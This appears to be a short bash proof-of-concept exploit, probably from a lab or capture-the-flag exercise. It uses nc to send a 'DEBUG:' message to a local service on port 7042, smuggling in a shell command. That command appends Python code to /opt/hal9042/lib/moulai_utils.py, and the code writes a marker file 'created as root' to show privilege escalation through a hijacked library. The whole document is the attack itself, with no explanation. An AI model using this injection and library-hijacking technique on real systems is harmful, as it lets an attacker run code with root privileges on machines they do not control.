#!/bin/bash

echo 'DEBUG: echo "echo \"open('\''/tmp/root_escal.txt'\'','\''w'\'').write('\''created as root'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042